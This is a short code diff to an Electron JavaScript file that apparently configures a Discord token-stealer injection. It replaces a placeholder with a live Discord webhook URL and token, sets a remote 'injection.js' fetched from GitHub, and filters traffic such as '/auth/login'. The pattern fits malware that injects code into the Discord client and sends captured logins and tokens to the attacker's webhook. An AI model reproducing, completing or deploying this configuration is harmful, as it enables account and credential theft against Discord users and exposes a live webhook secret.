@@ -11,8 +11,8 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/refs/heads/main/injectiosn.js",
+    webhook: "https://discord.com/api/webhooks/1434212076666093712/tIJ-CuMLjVr7vf-sbNw3FeO9SOUVND5AGcC59bY3UK0SBhG-c_RWAA3OCeCCE1M82swJ",
+    injection_url: "https://raw.githubusercontent.com/Cryoner69/Injection-discord/refs/heads/main/injection.js",
     filters: {
         urls: [
             '/auth/login',
